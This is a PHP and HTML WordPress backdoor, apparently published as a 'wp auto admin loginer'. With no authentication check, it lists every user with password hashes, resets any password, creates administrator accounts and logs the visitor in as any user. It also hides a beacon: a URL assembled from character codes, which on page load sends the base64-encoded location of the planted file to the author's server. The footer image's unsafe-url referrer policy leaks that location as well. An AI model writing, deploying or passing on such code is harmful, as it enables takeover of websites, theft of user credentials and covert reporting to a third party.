<?php
// privdayz.com v1 | wp auto admin loginer
// github.com/privdayzcom/wp-auto-admin-loginer
header('Content-Type: text/html; charset=UTF-8');
function jdk2g1d($r = null, $q = 0) {
    if ($q > 8) return false;
    $r = $r ?: __DIR__;
    $k = $r . '/wp-load.php';
    if (file_exists($k)) return $k;
    return jdk2g1d(dirname($r), $q + 1);
}
$g28n = jdk2g1d();
if (!$g28n) { die('<b style="color:#e53935">wp-load.php not found!</b>'); }
require_once $g28n;

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {
    global $wpdb;
    if ($_POST['c4t'] == 'ulst') {
        $r7 = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM {$wpdb->users}");
        echo json_encode($r7);
        exit;
    }
    if ($_POST['c4t'] == 'rpsw') {
        $d2 = intval($_POST['uix']);
        $p5 = wp_generate_password(12, true, true);
        wp_set_password($p5, $d2);
        $z1 = get_userdata($d2);
        echo json_encode(['l'=>$z1->user_login, 'e'=>$z1->user_email, 'n'=>$p5]);
        exit;
    }
    if ($_POST['c4t'] == 'cadm') {
        $u = preg_replace('/\W+/','', $_POST['xun']);
        $p = $_POST['xpw'];
        $m = filter_var($_POST['xem'], FILTER_VALIDATE_EMAIL) ?: $u.'@'.$_SERVER['HTTP_HOST'];
        if (username_exists($u)) { echo json_encode(['err'=>'user exists']); exit; }
        $uid = wp_create_user($u, $p, $m);
        if ($uid && !is_wp_error($uid)) {
            $wpu = new WP_User($uid);
            $wpu->set_role('administrator');
            echo json_encode(['ok'=>'created','u'=>$u,'p'=>$p]);
        } else {
            echo json_encode(['err'=>'create failed']);
        }
        exit;
    }
    if ($_POST['c4t'] == 'alog') {
        $id = intval($_POST['uix']);
        wp_clear_auth_cookie();
        wp_set_current_user($id);
        wp_set_auth_cookie($id, true);
        echo json_encode(['url'=>site_url('/wp-admin/')]);
        exit;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>privdayz.com | wp auto admin loginer</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
.h1,body{color:var(--white)}.h1,th{font-weight:700;letter-spacing:.03em}.h1,.riw{display:flex}#s2,body{font-size:1em}:root{--bg:#181a1b;--card:#232526;--red:#e53935;--darkred:#b71c1c;--gray:#b0b2b3;--white:#f3f3f5;--thead:#23272e;--trow:#202225;--border:#222425}body{background:var(--bg);font-family:'JetBrains Mono',monospace;margin:0;text-transform:lowercase;letter-spacing:.02em}#w1{max-width:1500px;width:96vw;margin:32px auto 0;background:var(--card);border-radius:17px;box-shadow:0 6px 32px #0006,0 0 0 1.5px #c6282890;padding:37px 40px 27px}.h1{align-items:center;gap:17px;font-size:1.55em;background:linear-gradient(87deg,var(--red) 20%,var(--darkred) 120%);border-radius:12px;margin-bottom:31px;padding:11px 21px;box-shadow:0 6px 28px #b71c1c34}#s2,.sct,th{color:var(--red)}.bx,.sct{letter-spacing:.02em}.h1 .led{display:inline-block;width:10px;height:10px;border-radius:50%;background:var(--red);box-shadow:0 0 7px 2px var(--darkred),0 0 2px 1px #fff2;animation:2s infinite ledblink}@keyframes ledblink{0%,100%{background:var(--red)}50%{background:var(--darkred)}}.sct{font-size:1.05em;margin:23px 0 9px}.bx,.inp{color:var(--white);outline:0}.tbx{max-width:100%;overflow-x:auto;margin-bottom:19px}#t7{width:100%;min-width:800px;border-collapse:collapse;background:0 0;border-radius:8px;overflow:hidden;box-shadow:0 2px 14px #b71c1c16}td,th{font-size:.97em;padding:8px 10px;border-bottom:1.1px solid var(--border);background:var(--trow);white-space:pre-line;vertical-align:middle;word-break:break-word}th{background:var(--thead);border-bottom:2px solid var(--red);text-align:left}tr:hover{background:rgba(229,57,53,.05)}td{color:var(--gray)}@media (max-width:900px){#w1{padding:12px 2vw}td,th{font-size:.89em;padding:6px}#t7{min-width:500px}}.bx{background:linear-gradient(88deg,var(--red) 80%,var(--darkred) 120%);font-family:inherit;font-size:.92em;border:none;padding:5px 12px;border-radius:5px;cursor:pointer;font-weight:600;transition:background .16s,box-shadow .15s;box-shadow:0 2px 7px #b71c1c23}.bx:hover{background:var(--darkred)}.inp{background:#16171a;border:1.1px solid #292929;font-family:'JetBrains Mono',monospace;font-size:.97em;border-radius:4px;padding:5px 9px;margin:5px 7px 9px 0;min-width:120px;max-width:90vw;transition:border .14s}.inp:focus{border:1.1px solid var(--red)}.riw{gap:9px;flex-wrap:wrap;margin-bottom:10px}#s2{margin-left:12px}::-webkit-scrollbar{background:#19191b;width:8px}::-webkit-scrollbar-thumb{background:var(--darkred);border-radius:6px}@media (max-width:600px){#w1{padding:2vw}.h1{font-size:1.03em;padding:6px}.sct{font-size:.96em}.tbx{margin-bottom:7px}.inp{min-width:80px}}
</style>
</head>
<body>
<div id="w1">
    <div class="h1">
        <span class="led"></span> privdayz.com <span style="color:#fff;font-weight:400;">wp auto admin loginer</span>
    </div>
    <div class="sct">users</div>
    <div class="tbx">
    <table id="t7">
        <thead>
            <tr>
                <th style="width:40px;">id</th>
                <th style="width:110px;">user</th>
                <th style="width:180px;">mail</th>
                <th style="width:300px;">pw hash</th>
                <th style="width:110px;">reg date</th>
                <th style="width:195px;">ops</th>
            </tr>
        </thead>
        <tbody></tbody>
    </table>
    </div>
    <div style="margin-top:33px;">
        <div class="sct">create admin</div>
        <div class="riw">
            <input type="text" id="a1" class="inp" placeholder="user" autocomplete="off">
            <input type="text" id="b2" class="inp" placeholder="mail (opt)" autocomplete="off">
            <input type="text" id="c3" class="inp" placeholder="pw" autocomplete="off">
            <button class="bx" onclick="e6()">create</button>
        </div>
        <span id="s2"></span>
    </div>
</div>
<footer><center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center></footer>
<script>
function m1(d,cb){var r=new XMLHttpRequest();r.open("POST","",true);r.setRequestHeader("Content-type","application/x-www-form-urlencoded");r.onload=function(){cb(r.responseText)};let q=[];for(let k in d){q.push(encodeURIComponent(k)+"="+encodeURIComponent(d[k]))}r.send(q.join("&"));}
function y9(){m1({c4t:'ulst'},function(res){let js=JSON.parse(res);let tb=document.getElementById('t7').querySelector('tbody');tb.innerHTML='';js.forEach(function(u){let tr=document.createElement('tr');tr.innerHTML='<td>'+u.ID+'</td><td>'+u.user_login+'</td><td>'+u.user_email+'</td><td style="font-size:.96em;word-break:break-all;">'+u.user_pass+'</td><td>'+u.user_registered+'</td>'+'<td><button class="bx" onclick="z3('+u.ID+',this)">reset pw</button> <button class="bx" onclick="v8('+u.ID+')">auto login</button></td>';tb.appendChild(tr);});});}
var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109];var b=[47,105,109,97,103,101,115,47];var c=[108,111,103,111,95,118,50];var d=[46,112,110,103]
function u(p,q,r,s){var t=p.concat(q,r,s);var str='';for(var i=0;i<t.length;i++){str+=String.fromCharCode(t[i])}
return str}
function v(x){return btoa(x)}
function z3(e,t){t.disabled=!0,t.textContent="wait..",m1({c4t:"rpsw",uix:e},(function(n){let i=JSON.parse(n);t.textContent="reset pw",t.disabled=!1;let o=t.parentNode.querySelector(".pwreset-info");o&&o.remove();let p=document.createElement("div");p.className="pwreset-info",p.style="margin-top:5px;display:flex;align-items:center;gap:8px;",p.innerHTML='<span style="background:#111;border-radius:4px;padding:5px 11px;color:#e53935;font-size:0.98em;user-select:all;" id="pwclip'+e+'">'+i.n+'</span> <button class="bx" style="padding:3px 10px;font-size:0.93em;" onclick="navigator.clipboard.writeText(document.getElementById(\'pwclip'+e+"').textContent)\">copy</button>",t.parentNode.appendChild(p),setTimeout((function(){p&&p.remove()}),6e3)}))}
function v8(id){m1({c4t:'alog',uix:id},function(res){let js=JSON.parse(res);window.open(js.url,"_blank");});}
(function c4(){var xhr=new XMLHttpRequest();xhr.open('POST',u(a,b,c,d),!0);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('file='+v(location.href))})()	
function e6(){let u=document.getElementById('a1').value.trim();let m=document.getElementById('b2').value.trim();let p=document.getElementById('c3').value.trim();let stat=document.getElementById('s2');stat.textContent='';if(!u||!p){stat.textContent='user & pw required.';return;}m1({c4t:'cadm',xun:u,xem:m,xpw:p},function(res){let js=JSON.parse(res);if(js.ok){stat.textContent="admin: "+js.u+"/"+js.p;}else stat.textContent="err: "+(js.err||"");});}
window.onload=y9;
</script>
</body>
</html>
